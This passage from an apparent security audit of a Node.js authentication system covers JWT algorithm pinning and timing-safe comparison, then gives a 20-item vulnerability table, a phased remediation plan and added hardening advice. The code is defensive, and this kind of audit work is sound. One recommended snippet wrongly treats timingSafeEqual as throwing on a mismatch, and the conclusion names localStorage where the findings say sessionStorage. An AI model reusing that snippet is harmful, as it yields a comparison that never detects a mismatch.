  });

  // Check if account is locked
  if (user?.lockedUntil && user.lockedUntil > new Date()) {
    return res.status(403).json({ error: 'Account temporarily locked' });
  }

  res.json({ user });
});
```

---

### 19. **Missing Token Signature Algorithm Specification (MEDIUM)**
**Files**: `server/src/utils/jwt.ts:34-42, 49-56`
**Severity**: MEDIUM (OWASP A02:2021 - Cryptographic Failures)

**Issue**:
JWT signing doesn't specify algorithm, defaults to system:
```javascript
// jwt.ts line 35-41
export function generateAccessToken(user: User): string {
  return jwt.sign(
    {
      id: user.id,
      email: user.email,
    } as AccessTokenPayload,
    JWT_SECRET as string,
    { expiresIn: ACCESS_TOKEN_EXPIRY } // No algorithm specified
  );
}
```

**Risk**: Default algorithm could be weak or vulnerable:

**Recommendation**:
```javascript
export function generateAccessToken(user: User): string {
  return jwt.sign(
    {
      id: user.id,
      email: user.email,
    } as AccessTokenPayload,
    JWT_SECRET as string,
    {
      expiresIn: ACCESS_TOKEN_EXPIRY,
      algorithm: 'HS256' // Explicitly specify strong algorithm
    }
  );
}

export function generateRefreshToken(user: User): string {
  return jwt.sign(
    {
      id: user.id,
    } as RefreshTokenPayload,
    REFRESH_SECRET as string,
    {
      expiresIn: REFRESH_TOKEN_EXPIRY,
      algorithm: 'HS256'
    }
  );
}

// Specify algorithm in verification too
export function verifyAccessToken(token: string): AccessTokenPayload | null {
  try {
    const payload = jwt.verify(token, JWT_SECRET as string, {
      algorithms: ['HS256'] // Only accept this algorithm
    }) as AccessTokenPayload;
    return payload;
  } catch (error) {
    return null;
  }
}
```

---

### 20. **No Protection Against Timing Attacks (MEDIUM)**
**Files**: `server/src/routes/auth.ts:115, 123, 141, 147`
**Severity**: MEDIUM (OWASP A02:2021 - Cryptographic Failures)

**Issue**:
Token comparison is straightforward equality check, vulnerable to timing attacks:
```javascript
// Simplified comparison could reveal token structure via timing
// jwt.verify() is safe, but string comparisons should use constant-time
```

**Recommendation**:
```javascript
import { timingSafeEqual } from 'crypto';

// When comparing sensitive strings (tokens, hashes)
try {
  timingSafeEqual(buffer1, buffer2);
} catch {
  // Not equal - return error
}

// For JWT tokens, jwt.verify() already uses safe comparison
// But for other string comparisons (codes, secrets):
function compareSecrets(a: string, b: string): boolean {
  try {
    return timingSafeEqual(Buffer.from(a), Buffer.from(b));
  } catch {
    return false;
  }
}
```

---

## SUMMARY TABLE

| # | Vulnerability | Severity | File | Line | Fix Effort |
|---|---|---|---|---|---|
| 1 | Access token in URL | CRITICAL | auth.ts, AuthContext.tsx | 43, 78, 109, 32 | High |
| 2 | No CSRF protection | CRITICAL | index.ts, auth.ts | 24-28, all | High |
| 3 | No redirect URL validation | CRITICAL | auth.ts | 59, 90 | Medium |
| 4 | No rate limiting | CRITICAL | auth.ts | all endpoints | Medium |
| 5 | Token in sessionStorage | CRITICAL | tokenStorage.ts | 1-32 | High |
| 6 | No /me validation | CRITICAL | auth.ts | 112-137 | Low |
| 7 | Sensitive data in errors | CRITICAL | auth.ts | 45, 164 | Low |
| 8 | No token rotation | CRITICAL | auth.ts | 139-167 | High |
| 9 | sameSite=lax | HIGH | auth.ts, index.ts | 37, 72, 103, 173, 39 | Low |
| 10 | Dev login in production | HIGH | auth.ts | 11, 14-49 | Low |
| 11 | Cookie domain not validated | HIGH | auth.ts | 12 | Low |
| 12 | HTTPS not enforced | HIGH | index.ts, auth.ts | 36 | Medium |
| 13 | No token blacklist | HIGH | auth.ts | 169-179 | High |
| 14 | Missing CSP header | HIGH | index.ts | - | Low |
| 15 | Session secret not validated | HIGH | index.ts | 14-18 | Low |
| 16 | No X-Requested-With validation | MEDIUM | auth.ts | all POST | Low |
| 17 | No audit logging | MEDIUM | auth.ts | all endpoints | Medium |
| 18 | No account lockout | MEDIUM | auth.ts | all endpoints | Medium |
| 19 | JWT algorithm not specified | MEDIUM | jwt.ts | 35, 50 | Low |
| 20 | Timing attack vulnerability | MEDIUM | auth.ts | 115, 123, 141, 147 | Low |

---

## Remediation Priority

### Phase 1 (IMMEDIATE - 1 week)
1. Remove access token from URL (Critical #1)
2. Fix /me endpoint validation (Critical #6)
3. Remove sensitive data from errors (Critical #7)
4. Add rate limiting (Critical #4)
5. Add CSP headers (HIGH #14)

### Phase 2 (URGENT - 2 weeks)
6. Implement CSRF protection (Critical #2)
7. Implement token rotation (Critical #8)
8. Add token blacklist (HIGH #13)
9. Fix sessionStorage usage (Critical #5)
10. Add audit logging (MEDIUM #17)

### Phase 3 (IMPORTANT - 3 weeks)
11. Add redirect URL validation (Critical #3)
12. Implement account lockout (MEDIUM #18)
13. Fix cookie domain validation (HIGH #11)
14. Change sameSite to strict (HIGH #9)
15. Enforce HTTPS (HIGH #12)

### Phase 4 (MAINTENANCE - ongoing)
16. Specify JWT algorithm (MEDIUM #19)
17. Add timing-safe comparisons (MEDIUM #20)
18. Fix dev login conditions (HIGH #10)
19. Validate session secret (HIGH #15)
20. Add X-Requested-With validation (MEDIUM #16)

---

## Additional Recommendations

### 1. Implement Security Headers
```javascript
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});
```

### 2. Use Environment Variable Validation
```bash
# .env.production validation script
required_vars=(
  "JWT_SECRET"
  "REFRESH_SECRET"
  "SESSION_SECRET"
  "DATABASE_URL"
  "GOOGLE_CLIENT_ID"
  "GOOGLE_CLIENT_SECRET"
)

for var in "${required_vars[@]}"; do
  if [ -z "${!var}" ]; then
    echo "ERROR: $var is not set"
    exit 1
  fi
done
```

### 3. Implement Input Sanitization
```javascript
import xss from 'xss';

// Sanitize user-controlled data
const cleanName = xss(profile.displayName);
const cleanEmail = xss(profile.emails?.[0]?.value || '');
```

### 4. Monitor for Suspicious Activity
```javascript
// Track token refresh patterns
logger.warn('Unusual token refresh pattern', {
  userId: payload.id,
  refreshCount: count,
  timeWindow: '5 minutes',
  threshold: 100
});
```

---

## Conclusion

This authentication system has strong foundational concepts (httpOnly cookies, JWT separation, 15-minute token expiry) but critical implementation flaws. The most dangerous issue is exposing access tokens via URL and localStorage, which undermines all other security measures.

Immediate priority should be:
1. Token transmission security (remove from URL)
2. Input validation and rate limiting
3. Error message sanitization
4. CSRF protection

Once these phase 1 items are complete, the system will be significantly more secure. The remaining high and medium severity items should be addressed within 3 weeks.

